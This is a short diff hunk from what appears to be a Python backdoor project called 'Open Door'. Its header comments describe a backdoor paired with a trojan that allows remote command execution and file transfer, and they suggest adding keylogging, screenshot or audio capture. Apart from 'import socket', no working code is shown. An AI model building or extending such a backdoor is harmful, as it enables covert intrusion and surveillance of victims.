@@ -4,7 +4,6 @@
 # A backdoor executed along with the Tragic Troy trojan.
 # Open Door will allow for remote command execution, file uploads and downloads.
 # This can easily be modified to add extra functionality such as a keylogger, screenshot capture or audio streaming.
-#
 
 # Libraries
 import socket
